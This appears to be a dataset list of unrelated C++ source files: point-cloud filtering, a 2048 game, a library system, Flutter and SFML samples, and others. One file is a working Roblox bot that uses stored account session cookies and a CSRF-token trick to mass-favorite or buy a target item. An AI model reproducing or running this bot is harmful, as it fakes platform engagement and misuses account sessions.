    "#include <iostream>\n#include <pcl/io/pcd_io.h>\n#include <pcl/point_types.h>\n#include <pcl/filters/statistical_outlier_removal.h>\n#include<pcl/visualization/pcl_visualizer.h>\nint\nmain(int argc, char** argv)\n{\n\tpcl::PointCloud<pcl::PointXYZ>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZ>);\n\tpcl::PointCloud<pcl::PointXYZ>::Ptr cloud_filtered(new pcl::PointCloud<pcl::PointXYZ>);\n\t// \u586b\u5165\u70b9\u4e91\u6570\u636e\n\tpcl::PCDReader reader;\n\t// \u628a\u8def\u5f84\u6539\u4e3a\u81ea\u5df1\u5b58\u653e\u6587\u4ef6\u7684\u8def\u5f84\n\treader.read<pcl::PointXYZ>(\"table_scene_lms400.pcd\", *cloud);\n\tstd::cerr << \"Cloud before filtering: \" << std::endl;\n\tstd::cerr << *cloud << std::endl;\n\t// \u521b\u5efa\u6ee4\u6ce2\u5668\u5bf9\u8c61\n\tpcl::StatisticalOutlierRemoval<pcl::PointXYZ> sor;\n\tsor.setInputCloud(cloud);//\u8bbe\u7f6e\u5f85\u6ee4\u6ce2\u7684\u70b9\u4e91\n\tsor.setMeanK(50);//\u8bbe\u7f6e\u5728\u8fdb\u884c\u7edf\u8ba1\u65f6\u8003\u8651\u67e5\u8be2\u70b9\u90bb\u5c45\u70b9\u6570\n\tsor.setStddevMulThresh(1.0);//\u8bbe\u7f6e\u5224\u65ad\u662f\u5426\u4e3a\u79bb\u7fa4\u70b9\u7684\u9608\u503c\n\tsor.filter(*cloud_filtered);//\u5c06\u6ee4\u6ce2\u7ed3\u679c\u4fdd\u5b58\u5728cloud_filtered\u4e2d\n\tstd::cerr << \"Cloud after filtering: \" << std::endl;\n\tstd::cerr << *cloud_filtered << std::endl;\n\tpcl::PCDWriter writer;\n\twriter.write<pcl::PointXYZ>(\"table_scene_lms400_inliers.pcd\", *cloud_filtered, false);\n\tsor.setNegative(true);\n\n\n\tpcl::visualization::PCLVisualizer viewer(\"statistic removal\");\n\tint v1(1);\n\tint v2(2);\n\t//\u521b\u5efa\u89c6\u7a97\n\tviewer.createViewPort(0, 0, 0.5, 1, v1);\n\tviewer.createViewPort(0.5, 0, 1, 1, v2);\n\n\tviewer.addPointCloud(cloud, \"cloud\", v1);\n\tviewer.addPointCloud(cloud_filtered, \"cloud_filtered\", v2);\n\n\tsor.filter(*cloud_filtered);\n\twriter.write<pcl::PointXYZ>(\"table_scene_lms400_outliers.pcd\", *cloud_filtered, false);\n\twhile (!viewer.wasStopped())\n\t{\n\t\tviewer.spinOnce();\n\t}\n\n\treturn (0);\n}",
    "#include <iostream>\n#include <cstring>\n#include <sstream>\n#include <fstream>\n#include <cpr/cpr.h>\n#include <nlohmann/json.hpp>\n#include <regex>\n\n// -- INFOS -- //\n\nstd::string RobloxUrl = \"https://www.roblox.com\";\nlong long int TargetFavoriteItem = 15556784020; // Change this with your target item's asset id (Works with games aswell but you can purchase games)\nbool IsBuyingEnabled = false; // Set it to true if you want accounts to buy it (Dont use this if the target is a game)\nlong long int TargetFavoriteItemProduct = 22; // Product id of target item\nint TargetItemPrice = 0; // Price of target item\n\n// -- Functions and Main -- //\n\nnlohmann::json ToJson(std::string JsonSource) {\n    return nlohmann::json::parse(JsonSource.c_str());\n}\n\nstd::string GetAccounts() {\n    std::ifstream file(\"Accounts.txt\");\n\n    if (!file.is_open()) {\n        std::cout << \"Error opening file\" << std::endl;\n        return \"\";\n    }\n    std::string fileContents((std::istreambuf_iterator<char>(file)),\n                            std::istreambuf_iterator<char>());\n    file.close();\n    return fileContents;\n}\n\nvoid FavTarget(long long int TargetID) {\n    std::string AccountTXT = GetAccounts();\n    std::regex pattern(\"Username: (.+)\\nCookie: (.+)\");\n    std::sregex_iterator iter(AccountTXT.begin(), AccountTXT.end(), pattern);\n    std::sregex_iterator end;\n\n    while (iter != end) {\n        std::smatch match = *iter;\n        std::string MyUser = match[1];\n        std::string Cookie = match[2];\n\n        //std::cout << Cookie << std::endl;\n\n        cpr::Session newsession;\n        newsession.SetHeader(cpr::Header{{\"Content-Type\", \"application/json\"}});\n        newsession.SetCookies(cpr::Cookies{{\".ROBLOSECURITY\", Cookie.c_str()}});\n        newsession.SetUrl(cpr::Url(\"https://auth.roblox.com/v2/logout\"));\n\n        cpr::Response resp = newsession.Post();\n\n        auto it = resp.header.find(\"x-csrf-token\");\n        if (it != resp.header.end()) {\n            newsession.UpdateHeader(cpr::Header({{\"referer\", RobloxUrl.c_str()}, {\"x-csrf-token\", it->second}}));\n        }\n\n        nlohmann::json BodyGetUserid;\n        BodyGetUserid[\"usernames\"] = {MyUser.c_str()};\n        BodyGetUserid[\"excludeBannedUsers\"] = true;\n\n        newsession.SetBody(cpr::Body(BodyGetUserid.dump()));\n        newsession.SetUrl(cpr::Url(\"https://users.roblox.com/v1/usernames/users\"));\n        \n        cpr::Response UseridResponse = newsession.Post();\n        nlohmann::json UseridJson = ToJson(UseridResponse.text);\n        long long int MyUserId = UseridJson[\"data\"][0][\"id\"];\n\n        if (IsBuyingEnabled) {\n            // Purchase the target thing\n            std::string BuyUrl = \"https://apis.roblox.com/creator-marketplace-purchasing-service/v1/products/\" + std::to_string(TargetID) + \"/purchase\";\n            nlohmann::json BuyBody;\n            BuyBody[\"expectedPrice\"] = TargetItemPrice;\n            BuyBody[\"expectedSellerId\"] = 1;\n            BuyBody[\"expectedCurrency\"] = 1;\n\n            newsession.SetUrl(cpr::Url(BuyUrl.c_str()));\n            newsession.SetBody(cpr::Body(BuyBody.dump()));\n            newsession.Post();\n        }\n\n\n        // Favorite it\n        newsession.SetBody(cpr::Body()); // Set body to nothing\n\n        std::string TargetUrl = \"https://catalog.roblox.com/v1/favorites/users/\" + std::to_string(MyUserId) + \"/assets/\" + std::to_string(TargetID) + \"/favorite\";\n        newsession.SetUrl(cpr::Url(TargetUrl.c_str()));\n\n        cpr::Response FavResponse = newsession.Post();\n\n        std::cout << FavResponse.status_code << std::endl;\n\n        iter++;\n\n        Sleep(1500); // 1.5 sec\n    }\n}\n\nint main(int, char**){\n    FavTarget(TargetFavoriteItem);\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <queue>\n#include \"LFR.h\"\n#include \"OPT.h\"\n#include \"Clock.h\"\n#include <iomanip>\n\nstd::queue<int> generate_queue();\n\nint main(){\n    std::queue<int> q = generate_queue();\n    \n    std::cout << \"hit_count_LFR  \" << \"hit_count_OPT\" << \"size  \" << \"hit_count_CLOCK\"<< std::endl;\n    for (int size = 4; size < 32; size++)\n    {\n        std::cout << size;\n        if (size < 10)\n            std::cout << \" \";\n        std::cout << std::setw(12) << std::setprecision(4) << std::showpoint << (double)LFR(q, size) / 3.2 << \"%\"\n        << std::setw(12) << (double)OPT(q, size) / 3.2 << \"%\"\n        << std::setw(12) << (double)Clock(q, size) / 3.2 << \"%\" << std::endl;\n    }\n\n    return 0;\n}\n\nstd::queue<int> generate_queue()\n{\n    unsigned seed = time(0);\n    srand(seed);\n    std::queue<int> q;\n    for (int i = 0; i < 64; i++)\n    {\n        int M = rand() % 320;\n        q.push(M);\n        q.push((M + 1) % 320);\n        M = rand() % (M + 2);\n        q.push(M);\n        q.push((M + 1) % 320);\n        int k = (M + 2) % 320;\n        M = k + rand() % (320 - k);\n        q.push(M);\n    }\n    return q;\n}",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2023-06-28\n// PURPOSE: unit tests for Smooth library\n//          https://github.com/RobTillaart/SIMON\n//\n\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"SmartPin.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"Arduino SmartPin library\\n\");\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constructor)\n{\n  // assertEqual(42, sm.get_window());\n  // assertEqual(0, sm.get_count());\n  // assertEqualFloat(0, sm.get_avg(), 0.0001);\n\n  // Smooth sm0(5, 0, 0);\n  // assertEqual(5, sm0.get_window());\n  // assertEqual(0, sm0.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm1(7, 20);\n  // assertEqual(7, sm1.get_window());\n  // assertEqual(20, sm1.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm2(15, 25, 10);\n  // assertEqual(15, sm2.get_window());\n  // assertEqual(25, sm2.get_count());\n  // assertEqualFloat(10, sm2.get_avg(), 0.0001);\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include \"globals.h\"\n#include \"client.h\"\n\nstring sendFileWithCommand(tcp::socket& socket, const string& user, const string &file, const string& command) {\n    boost::filesystem::path p(dirClient + \"/\" + file);\n    ifstream source_file(dirClient + \"/\" + file, ios_base::binary | ios_base::ate);\n    if (!source_file)\n    {\n        std::cout << \"failed to open \" << file << std::endl;\n        return \"ERROR\";\n    }\n\n    // get length of file\n    source_file.seekg(0, source_file.end);\n    auto file_size = source_file.tellg();\n    source_file.seekg(0, source_file.beg);\n\n    enum { MessageSize = 1024 };\n    array<char, MessageSize> buf{};\n\n    // first send file name and file size to server\n    boost::asio::streambuf request;\n    std::ostream request_stream(&request);\n    request_stream << command << \" \" << user << \" \" << p.filename().string() << \" \" << file_size << \"\\n\\n\";\n    boost::asio::write(socket, request);\n\n    // then send file\n    std::cout << \"start sending file content.\\n\";\n\n\n    while (source_file) {\n        source_file.read(buf.data(), buf.size());\n        if (source_file.fail() && !source_file.eof()) {\n            auto msg = \"Failed while reading file\";\n            std::cout << msg;\n            throw std::fstream::failure(msg);\n        }\n\n        auto m_buf = boost::asio::buffer(buf.data(), static_cast<size_t>(source_file.gcount()));\n        boost::system::error_code error3;\n        boost::asio::write(socket, m_buf, error3);\n\n        cout << \"send byte\" << endl;\n    }\n\n    source_file.close();\n\n    cout << \"file stream sent\" << endl;\n\n    if (command == \"zip\" || command == \"unzip\") {\n        boost::asio::streambuf response;\n        boost::system::error_code error2;\n        boost::asio::read(socket, response, boost::asio::transfer_all(), error2);\n        std::istream ss(&response);\n        std::string ok;\n        std::string name;\n        ss >> ok; ss >> name;\n        std::cout << \"message: \" << ok << \" \" << name << std::endl;\n        if (ok == \"Error\") {\n            return ok;\n        }\n\n        return name;\n    }\n\n    if (command == \"zip-and-get\") {\n        return file + \".sev\";\n    } else if (command == \"unzip-and-get\") {\n        size_t lastOf = file.find_last_of(\".\");\n        string path = file.substr(0, lastOf);\n        return path;\n    }\n}\n\nbool getFileWithCommand(tcp::socket& socket, const string& user, const string &file) {\n    std::array<char, 1024> buf{};\n    boost::asio::streambuf request_buf;\n    boost::system::error_code ignore_error_read_until;\n    boost::asio::read_until(socket, request_buf, \"\\n\\n\", ignore_error_read_until);\n    std::cout<< \"request size:\" << request_buf.size() << \"\\n\";\n\n    istream requestStream(&request_buf);\n    string responseStatus;\n    string file_path;\n    size_t file_size = 0;\n\n    requestStream >> responseStatus;\n    requestStream >> file_path;\n    requestStream >> file_size;\n\n\n\n    requestStream.read(buf.data(), 2); // eat the \"\\n\\n\"\n\n    cout << file_path << \" size is \" << file_size << endl;\n\n    size_t pos = file_path.find_last_of('\\\\');\n    if (pos!=std::string::npos)\n        file_path = file_path.substr(pos+1);\n\n    file_path = dirClient + \"/\" + file_path;\n\n    std::ofstream outputFile(file_path, std::ios_base::binary);\n    if (!outputFile)\n    {\n        std::cout << \"failed to open \" << file_path << std::endl;\n        return __LINE__;\n    }\n\n    // write extra bytes to file\n    do\n    {\n        requestStream.read(buf.data(), (std::streamsize) buf.size());\n        std::cout << __FUNCTION__ << \" write \" << requestStream.gcount() << \" bytes.\\n\";\n        outputFile.write(buf.data(), requestStream.gcount());\n    } while (requestStream.gcount() > 0);\n\n    if (outputFile.tellp() >= static_cast<std::streamsize>(file_size)) {\n        outputFile.close();\n        return true;\n    }\n\n\n    while (true) {\n        boost::system::error_code ignore_error;\n        size_t bytes = socket.read_some(boost::asio::buffer(buf.data(), buf.size()), ignore_error);\n        if (!ignore_error) {\n            if (bytes > 0) {\n                outputFile.write(buf.data(), static_cast<std::streamsize>(bytes));\n                if (outputFile.tellp() >= static_cast<std::streamsize>(file_size)) {\n                    outputFile.close();\n                    break;\n                }\n            }\n        } else {\n            cout << \"error while loop\" << endl;\n            return false;\n        }\n\n    }\n\n    return true;\n}\n\nstring zip(const string& user, const string &file) {\n    boost::asio::io_context ioContext;\n    tcp::resolver resolver(ioContext);\n    tcp::resolver::query query(hostIp, port);\n    tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);\n    tcp::resolver::iterator end;\n    tcp::socket socket(ioContext);\n    boost::system::error_code error = boost::asio::error::host_not_found;\n    boost::asio::connect(socket, endpoint_iterator, error);\n\n    if (error) {\n        cout << \"failed to connect\" << endl;\n        return __TIME__;\n    }\n\n    cout << \"connected to \" << hostIp ",
    "#include \"gameboard.h\"\n\n// default constructor\nGameBoard::GameBoard() : score(0), lastMove(0) {\n    board = std::vector<std::vector<int>>(SIZE, std::vector<int>(SIZE, 0));\n    srand(static_cast<unsigned int>(time(NULL)));\n    addRandom();\n    addRandom();    // 2048 game start with 2 random number.\n}\n\n// copy constructor\nGameBoard::GameBoard(const GameBoard& other)\n    : board(other.board), score(other.score), lastMove(other.lastMove) {\n}\n\n// score getter\nint GameBoard::getScore() const {\n    return score;\n}\n\n// print the board to let player see\nvoid GameBoard::printBoard() const {\n    std::cout << \"Score: \" << score << std::endl;\n    for (int i = 0; i < SIZE; ++i) {\n        for (int j = 0; j < SIZE; ++j) {\n            if (board[i][j] == 0) std::cout << \".\\t\";\n            else std::cout << board[i][j] << \"\\t\";\n        }\n        std::cout << std::endl;\n    }\n}\n\n// add a random number to the board, use the law:\n// 90% \"2\" and 10% \"4\" generate in board.\nvoid GameBoard::addRandom() {\n    int x, y;\n    do {\n        x = rand() % SIZE;\n        y = rand() % SIZE;\n    } while (board[x][y] != 0);\n    board[x][y] = (rand() % 10 < 9) ? 2 : 4;\n}\n\n// check the game board can move or not\nbool GameBoard::canMove() const {\n    for (int i = 0; i < SIZE; ++i) {\n        for (int j = 0; j < SIZE; ++j) {\n            if (board[i][j] == 0) return true;\n            if (j + 1 < SIZE && board[i][j] == board[i][j + 1]) return true;\n            if (i + 1 < SIZE && board[i][j] == board[i + 1][j]) return true;\n        }\n    }\n    return false;\n}\n\n// The non-zero numbers on the game board \n// are compressed to the left of the row in \n// preparation for the merge and move operations.\nvoid GameBoard::compress() {\n    for (int i = 0; i < SIZE; ++i) {\n        int k = 0;\n        for (int j = 0; j < SIZE; ++j) {\n            if (board[i][j] != 0) {\n                board[i][k++] = board[i][j];\n            }\n        }\n        for (; k < SIZE; ++k) {\n            board[i][k] = 0;\n        }\n    }\n}\n\n// merge the number\nvoid GameBoard::merge() {\n    for (int i = 0; i < SIZE; ++i) {\n        for (int j = 0; j < SIZE - 1; ++j) {\n            if (board[i][j] == board[i][j + 1] && board[i][j] != 0) {\n                board[i][j] *= 2;\n                score += board[i][j];\n                board[i][j + 1] = 0;\n            }\n        }\n    }\n}\n\n// move to left, command \"a\"\nbool GameBoard::moveLeft() {\n    srand(static_cast<unsigned int>(time(NULL)));\n    std::vector<std::vector<int>> oldBoard = board;\n    compress();\n    merge();\n    compress();\n    bool moved = (oldBoard != board);\n    if (moved) {\n        addRandom();\n    }\n    return moved;\n}\n\nvoid GameBoard::rotateBoard() {\n    std::vector<std::vector<int>> temp(SIZE, std::vector<int>(SIZE));\n    for (int i = 0; i < SIZE; ++i) {\n        for (int j = 0; j < SIZE; ++j) {\n            temp[j][SIZE - 1 - i] = board[i][j];\n        }\n    }\n    board = temp;\n}\n\n// move to right, command \"d\"\nbool GameBoard::moveRight() {\n    rotateBoard();\n    rotateBoard();\n    bool moved = moveLeft();\n    rotateBoard();\n    rotateBoard();\n    return moved;\n}\n\n// move to up, command \"w\"\nbool GameBoard::moveUp() {\n    rotateBoard();\n    rotateBoard();\n    rotateBoard();\n    bool moved = moveLeft();\n    rotateBoard();\n    return moved;\n}\n\n// move to down, command \"s\"\nbool GameBoard::moveDown() {\n    rotateBoard();\n    bool moved = moveLeft();\n    rotateBoard();\n    rotateBoard();\n    rotateBoard();\n    return moved;\n}\n\n// make the movement\nbool GameBoard::makeMove(char move) {\n    bool validMove = false;\n    switch (move) {\n        case 'w': validMove = moveUp(); break;\n        case 's': validMove = moveDown(); break;\n        case 'a': validMove = moveLeft(); break;\n        case 'd': validMove = moveRight(); break;\n        default: validMove = false; break;\n    }\n    return validMove;\n}\n\nint GameBoard::maxTile() const {\n    int maxTile = 0;\n    for (int i = 0; i < SIZE; ++i) {\n        for (int j = 0; j < SIZE; ++j) {\n            if (board[i][j] > maxTile) {\n                maxTile = board[i][j];\n}\n        }\n    }\n    return maxTile;\n}\n\n// count the empty space, preparation for the heuristic function\nint GameBoard::countEmptySpaces() const {\n    int count = 0;\n    for (const auto& row : board) {\n        for (int cell : row) {\n            if (cell == 0) {\n                count++;\n            }\n        }\n    }\n    return (count * 100) / (SIZE * SIZE);\n}\n\nint GameBoard::monotonicity() const {\n    int score = 0;\n    int maxScore = 2 * SIZE * (SIZE - 1); \n    for (int i = 0; i < SIZE; ++i) {\n        for (int j = 0; j < SIZE - 1; ++j) {\n            if (board[i][j] <= board[i][j + 1]) score++;\n            if (board[i][j] >= board[i][j + 1]) score++;\n        }\n        for (int j = 0; j < SIZE - 1; ++j) {\n            if (board[j][i] <= board[j + 1][i]) score++;\n            if (board[j][i] >= board[j + 1][i]) score++;\n        }\n    }\n    return (score * 100) / maxScore;\n}\n\nint GameBoard::maxTilePosition() const {\n    int maxTile = 0;\n    int cor",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include \"easylib.h\"\n\nusing namespace std;\n\nint main() {\n    Library library;\n    library.loadBooksFromFile(); // Load book data on startup\n    library.loadMembersFromFile(); // Load member data on startup\n\n    int choice;\n    do {\n// cout <<\"  _____                         _       _   _      \" << endl; \n// cout <<\" | ____|   __ _   ___   _   _  | |     (_) | |__   \" << endl;\n// cout <<\" |  _|    / _` | / __| | | | | | |     | | | '_ \\  \" << endl; \n// cout <<\" | |___  | (_| | \\__ \\ | |_| | | |___  | | | |_) | \" << endl; \n// cout <<\" |_____|  \\__,_| |___/  \\__, | |_____| |_| |_.__/  \" << endl;  \n// cout <<\"                       |___/                       \" << endl; \n        cout << \"\\nEasyLib - A Library Management System\" << endl;\n        cout << \"1. Add Book\" << endl;\n        cout << \"2. Issue Book\" << endl;\n        cout << \"3. Return Book\" << endl;\n        cout << \"4. Search Books\" << endl;\n        cout << \"5. Display All Books\" << endl;\n        cout << \"6. Add Member\" << endl;\n        cout << \"7. Display All Members\" << endl;\n        cout << \"8. Save Data\" << endl;\n        cout << \"0. Exit\" << endl;\n        cout << \"\\nEnter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1: library.addBook(); break;\n            case 2: library.issueBook(); break;\n            case 3: library.returnBook(); break;\n            case 4: library.searchBooks(); break;\n            case 5: library.displayAllBooks(); break;\n            case 6: library.addMember(); break;\n            case 7: library.displayAllMembers(); break;\n            case 8: library.saveBooksToFile(); library.saveMembersToFile(); break;\n            case 0: cout << \"Exiting...\\n\"; break;\n            default: cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 0);\n\n    return 0;\n}\n\n// Library member function definitions\nvoid Library::addBook() {\n    Book book;\n    cout << \"Enter Book Title: \";\n    cin.ignore(); // Clear input buffer\n    getline(cin, book.title);\n    cout << \"Enter Author: \";\n    getline(cin, book.author);\n    cout << \"Enter ISBN: \";\n    cin >> book.ISBN;\n    book.available = true;\n    books.push_back(book);\n    cout << \"Book added successfully!\\n\";\n}\n\nvoid Library::issueBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"\\nEnter ISBN of the book to issue: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN && books[i].available) {\n            foundBook = true;\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and add borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    members[j].borrowedBooks.push_back(ISBN);\n                    books[i].available = false;  // Mark book as issued\n                    cout << \"Book issued successfully to \" << members[j].name << \".\" << endl;\n                    return;\n                }\n            }\n            cout << \"Invalid Member ID!\\n\";\n            books[i].available = true; // Revert availability change\n            return;\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found or unavailable!\\n\";\n    }\n}\n\nvoid Library::returnBook() {\n    string ISBN;\n    int memberID;\n    bool foundBook = false;\n\n    cout << \"Enter ISBN of the book to return: \";\n    cin >> ISBN;\n\n    // Find the book by ISBN\n    for (size_t i = 0; i < books.size(); ++i) {\n        if (books[i].ISBN == ISBN) {\n            foundBook = true;\n            books[i].available = true;   // Mark book as available\n\n            cout << \"Enter Member ID: \";\n            cin >> memberID;\n\n            // Find the member by ID and remove borrowed book ISBN\n            for (size_t j = 0; j < members.size(); ++j) {\n                if (members[j].memberID == memberID) {\n                    vector<string>::iterator it = find(members[j].borrowedBooks.begin(), members[j].borrowedBooks.end(), ISBN);\n                    if (it != members[j].borrowedBooks.end()) {\n                        members[j].borrowedBooks.erase(it);\n                        cout << \"Book returned successfully!\\n\";\n                        return;\n                    } else {\n                        cout << \"Member has not borrowed this book!\\n\";\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    if (!foundBook) {\n        cout << \"Book not found!\\n\";\n    }\n}\n\nvoid Library::searchBooks() {\n    string searchTerm;\n    int choice;\n\n    cout << \"Search by:\\n\";\n    cout << \"1. Title\\n\";\n    cout << \"2. Author\\n\";\n    cout << \"3. ISBN\\n\";\n    cout << \"Enter your choice: \";\n    cin >> choice;\n    if (choice > 3 || choice < 1){\n        cout << \"Invalid Choice. Please try again.\" << endl;\n    }\n    else{\n    cin.ignore(); // Cl",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_yesno_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Audio.hpp>\n#include <SFML/Network.hpp>\n#include <iostream>\n\n\nconst sf::Uint8 clientAudioData   = 1;\nconst sf::Uint8 clientEndOfStream = 2;\n\n\n////////////////////////////////////////////////////////////\n/// Specialization of audio recorder for sending recorded audio\n/// data through the network\n////////////////////////////////////////////////////////////\nclass NetworkRecorder : public sf::SoundRecorder\n{\npublic:\n\n    ////////////////////////////////////////////////////////////\n    /// Constructor\n    ///\n    /// \\param host Remote host to which send the recording data\n    /// \\param port Port of the remote host\n    ///\n    ////////////////////////////////////////////////////////////\n    NetworkRecorder(const sf::IpAddress& host, unsigned short port) :\n    m_host(host),\n    m_port(port)\n    {\n    }\n\n    ////////////////////////////////////////////////////////////\n    /// Destructor\n    ///\n    /// \\see SoundRecorder::~SoundRecorder()\n    ///\n    ////////////////////////////////////////////////////////////\n    ~NetworkRecorder()\n    {\n        // Make sure to stop the recording thread\n        stop();\n    }\n\nprivate:\n\n    ////////////////////////////////////////////////////////////\n    /// \\see SoundRecorder::onStart\n    ///\n    ////////////////////////////////////////////////////////////\n    virtual bool onStart()\n    {\n        if (m_socket.connect(m_host, m_port) == sf::Socket::Done)\n        {\n            std::cout << \"Connected to server \" << m_host << std::endl;\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    }\n\n    ////////////////////////////////////////////////////////////\n    /// \\see SoundRecorder::onProcessSamples\n    ///\n    ////////////////////////////////////////////////////////////\n    virtual bool onProcessSamples(const sf::Int16* samples, std::size_t sampleCount)\n    {\n        // Pack the audio samples into a network packet\n        sf::Packet packet;\n        packet << clientAudioData;\n        packet.append(samples, sampleCount * sizeof(sf::Int16));\n\n        // Send the audio packet to the server\n        return m_socket.send(packet) == sf::Socket::Done;\n    }\n\n    ////////////////////////////////////////////////////////////\n    /// \\see SoundRecorder::onStop\n    ///\n    ////////////////////////////////////////////////////////////\n    virtual void onStop()\n    {\n        // Send a \"end-of-stream\" packet\n        sf::Packet packet;\n        packet << clientEndOfStream;\n        m_socket.send(packet);\n\n        // Close the socket\n        m_socket.disconnect();\n    }\n\n    ////////////////////////////////////////////////////////////\n    // Member data\n    ////////////////////////////////////////////////////////////\n    sf::IpAddress  m_host;   ///< Address of the remote host\n    unsigned short m_port;   ///< Remote port\n    sf::TcpSocket  m_socket; ///< Socket used to communicate with the server\n};\n\n\n////////////////////////////////////////////////////////////\n/// Create a client, connect it to a running server and\n/// start sending him audio data\n///\n////////////////////////////////////////////////////////////\nvoid doClient(unsigned short port)\n{\n    // Check that the device can capture audio\n    if (!sf::SoundRecorder::isAvailable())\n    {\n        std::cout << \"Sorry, audio capture is not supported by your system\" << std::endl;\n        return;\n    }\n\n    // Ask for server address\n    sf::IpAddress server;\n    do\n    {\n        std::cout << \"Type address or name of the server to connect to: \";\n        std::cin  >> server;\n    }\n    while (server == sf::IpAddress::None);\n\n    // Create an instance of our custom recorder\n    NetworkRecorder recorder(server, port);\n\n    // Wait for user input...\n    std::cin.ignore(10000, '\\n');\n    std::cout << \"Press enter to start recording audio\";\n    std::cin.ignore(10000, '\\n');\n\n    // Start capturing audio data\n    recorder.start(44100);\n    std::cout << \"Recording... press enter to stop\";\n    std::cin.ignore(10000, '\\n');\n    recorder.stop();\n}\n",
